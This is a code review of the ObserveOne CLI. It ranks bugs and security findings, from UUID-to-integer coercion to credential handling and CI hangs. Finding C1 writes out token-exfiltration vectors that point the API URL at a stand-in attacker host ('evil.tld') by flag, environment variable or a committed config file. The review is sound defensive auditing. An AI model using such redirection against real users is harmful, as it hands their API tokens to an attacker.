# ObserveOne CLI (`@observeone/cli`) — Full Code Review

Date: 2026-06-24. Scope: ~10k LOC (`src/`, non-test). Four concern-based passes: auth/config/secrets, HTTP/SSE/errors, config-as-code (`obs apply`), command-surface/UX. Findings are deduped and ranked. Nothing fixed.

## Cross-cutting theme: UUID-as-int coercion (prod-breaking)
The single biggest pattern. Resource ids are now UUID **strings** (post serial→uuid migration) but many code paths still `parseInt`/`Number()` them — works on dev int-ids, throws `NaN`/"Invalid ID" on prod. There's a partial plan for this (`cli-bug-id-based-commands-coerce-uuids-to-int-break-on-prod`); this review found it's **wider** than one site. All occurrences are tagged `[UUID]` below — fix them as one sweep.

---

## Critical

**C1 — Token exfiltration via attacker-controlled API URL.** `config.service.ts:73-82` + `api-client.service.ts:54-61`: the base URL is fully overridable with no host allowlist, and the request interceptor attaches `x-obs1-cli: <token>` to **every** outbound request regardless of host. Three vectors: `obs --api-url https://evil.tld …`, `OBS_API_URL=https://evil.tld …`, or a `.obs.config.json` (read from CWD) committed into any repo the user `cd`s into. Any of these silently sends the token to an attacker. Fix: host allowlist (`*.observeone.com` / `localhost` in dev) enforced before the auth header is attached; strip the token when the destination host differs from the issuing host.

**C2 — `monitor/check/heartbeat runs <id>` crash on UUIDs. [UUID]** `runs-command.ts:12,86`: `fetchRuns(id: number…)` + `parseNumericId` (`parseInt`) → `NaN` → "Invalid resource ID" before any API call. Every `obs <resource> runs <uuid>` is broken on the current schema. Fix: signature to `id: string`, non-empty check instead of `parseInt`.

**C3 — `parseNumericIds` breaks `--alert-channel-id` on prod. [UUID]** `cli-input.ts:52-67` wired as the `channel_ids` transformer in `schemas.ts:135` (monitor) and `:197` (check). `Number(entry)` throws on UUID strings, and the declared type is `string[]` (`types/index.ts:61,84`) — apply's `extractChannelIds` also expects strings. `obs monitor/check create --alert-channel-id <uuid>` throws. Fix: validate uuid-or-int and return `string[]` (no numeric coercion).

**C4 — `incident create --team-id <uuid>` corrupts the payload. [UUID]** `schemas.ts:348`: `team_id` uses the `toInt` transformer; `Incident.team_id` is typed `string` (`types/index.ts:207`). A UUID becomes `NaN`. Fix: drop the transformer, pass through as string.

**C5 — ora spinner left running on throw.** `suite/wait.ts:21-24,38` and `suite/run.ts:41,57`: spinner started inside `try`; the `catch` calls `process.exit(1)` without `spinner.stop()` — terminal cursor stays hidden/spinning after exit. Fix: `spinner?.stop()`/`.fail()` first thing in each catch (or hoist the declaration).

---

## High

**H1 — `obs apply` matches solely by name → rename silently duplicates + orphans.** `apply.ts:269,391,543,657,735,837`: no stable identity field; renaming a resource in the file creates a new one and leaves the old running, with no warning (summary just says "1 created"). Fix: warn on create listing existing names (likely-rename detection), or support an optional `id` pin.

**H2 — `obs validate` doesn't enforce the schema it emits.** `validate.ts:37-48` only checks required-present/non-empty; never runs the `buildJsonSchema` (`additionalProperties:false`, typed/enums). Wrong types, bad enums, and unknown keys all pass. Fix: validate against the emitted JSON Schema (ajv) or at least types + enum membership.

**H3 — Poll loops retry 4xx for the full timeout.** `api-client.service.ts:685-691,886-890`: `pollExecutionStatus`/`pollSuiteExecution` retry **all** errors (404 included) → a bad/deleted id hangs ~5 min (60×5s) before failing. CI stalls instead of failing fast. Fix: tag status on the axios error and break immediately on non-transient (4xx).

**H4 — SSE consumer-callback throw is swallowed as a "parse error".** `sse-client.service.ts:82-87`: `onMessage(parsed)` runs inside the same `try` as `JSON.parse`, so a callback throw is logged as "Failed to parse SSE message" and never reaches `onError`; the command then hangs to its timeout. Fix: parse in the try, call `onMessage` outside it.

**H5 — Secrets passed as `--var KEY=VALUE` land in shell history / `ps` / `/proc`.** `suite/secrets.ts:16-19`, `suite/generate.ts:29-33`: no masked-input alternative. Fix: when a value isn't supplied, prompt with inquirer `type:'password'`; document `--var-file` (uncommitted) as the CI-safe path.

**H6 — `logout` doesn't clear all credential sources; success message is false.** `logout.ts:21`: `clearApiKey()` deletes only the global `conf` entry. `getApiKey()` also reads `OBS_API_KEY` and `.obs.config.json` (`config.service.ts:98-109`), so logout can print "credentials cleared" while the token still authenticates. Fix: also clear the local file; warn if `OBS_API_KEY` is set (can't clear a parent env var).

**H7 — Non-TTY commands hang forever waiting on inquirer.** No TTY guard before `inquirer.prompt`: `incident.ts:62-71` (`--message`), `api-key.ts:57-67` (`--name`), `ai-check/delete.ts:34-43` (no `--yes`). In CI/pipes these block indefinitely. The repo already has `requireTTY`/`requireConfirmation` (`utils/confirm.ts`) — these sites bypass it. Fix: guard with `process.stdin.isTTY` (or use `requireConfirmation`) and exit non-zero.

**H8 — `suite toggle-public` makes a suite world-readable with no confirmation and no `--yes`.** `suite/toggle-public.ts:13-38`: unlike `delete`/`ci disconnect`, it flips public/private silently. Suite test creds/internal URLs become public on a stray call. Fix: add `-y/--yes` + `requireConfirmation`.

---

## Medium

**M1 — `.obs.config.json` is not gitignored and the type allows `apiKey`.** `types/index.ts:16` permits a local `apiKey`; the file isn't in `.gitignore` and one is committed in-repo. Latent credential-in-VCS trap. Fix: gitignore it; drop `apiKey` from the local-config type.

**M2 — Global `--api-key` persists to disk before validation.** `index.ts:110-112` → `config.service.ts:119-121`: a mistyped key overwrites the previously valid stored key on every run. Fix: keep it in-memory until validated (the `login` flow validates; the global flag doesn't).

**M3 — Raw `AxiosError` re-thrown for un-handled statuses (400/409/422) carries the auth header.** `api-client.service.ts:85`: any future caller that serializes the error leaks `x-obs1-cli`. Current CLI output path is safe (`formatError` reads only status/data). Fix: re-throw a clean `Error(data.message || message)`.

**M4 — Monitor apply idempotency: omitted `alert_on_failure`/`interval` triggers spurious updates.** `apply.ts:295 vs 307` (`?? true` asymmetry) and `:293-294 vs 305-306` (interval no-default): when the file omits the field but remote has `false`/a value, deepEqual mismatches and an update fires every run — and can overwrite/clear the remote value. Fix: treat omitted fields as "don't care" in the diff, or document that omission asserts the default.

**M5 — CI subcommand JSON error paths emit plain text, breaking `| jq`.** `ci/disconnect.ts:45`, `ci/status.ts:57`, `ci/webhook-token.ts:51`: catch blocks call `outputService.error(msg)` instead of `formatJsonOutput({status:'ERROR',…})` under `--json`. Fix: use the JSON envelope.

**M6 — `status-page add-monitor --order` sends `NaN` unguarded.** `status-page.ts:88`: `parseInt(options.order)` with no `isNaN` check (the sibling `reorder` at `:160` has it). Fix: mirror the guard.

**M7 — `ai-check wait` prints the JSON envelope unconditionally.** `ai-check/wait.ts:61`: human-mode users get spinner text + raw JSON on stdout. Fix: gate on `isJson` (or make it always-JSON and drop the spinner).

**M8 — `validateApiKey` doesn't restore a previously-undefined header.** `api-client.service.ts:95-112`: if no prior key, the tested key stays on `client.defaults.headers`. Fix: save/restore unconditionally.

---

## Low

- **L1 — ora spinners write to stdout, not stderr** (`suite/wait.ts:22-24`, `suite/run.ts:41`): pollutes `| jq`. Use `stream: process.stderr`.
- **L2 — ai-check ids use bare `parseInt`** (`ai-check/get.ts:26`, `delete.ts:28`, `run.ts:177`): consistent today (`Test.id` is `number`), but will break identically to C2/C3 when ai-check tables move to UUID. Track with the [UUID] sweep. Also missing radix.
- **L3 — ai-check help text says "AI browser check"/"AI-powered tests"** (`ai-check/index.ts:18`, `create.ts:13`, `delete.ts:13`, `run.ts:39`): canonical name is "Browser Check"; update when the surface is renamed `obs browser-check`.
- **L4 — Export surrogate `monitor_id` cross-refs aren't remapped on import** (`export.ts:167,192,229-230` vs `apply-config.ts:62-75`): apply doesn't process `status_pages[].monitors` yet, so the documented round-trip will attach wrong ids the moment it's wired. Latent; fix when status-page monitor attachment lands in apply.

---

## Verified clean
- Axios has a 30s timeout (`api-client.service.ts:43`); `update.service.ts` hits only the npm registry unauthenticated and executes nothing (no SSRF/supply-chain).
- No POST retry → no double-submit; SSE buffer `lines.pop()` correctly preserves partial frames across chunks.
- Command registration/wiring audited: all files registered, no duplicate names, `--json` global flows correctly via `OBS_JSON_OUTPUT`.
- Secrets list prints only `Object.keys` (no values); 401 UX is clear.
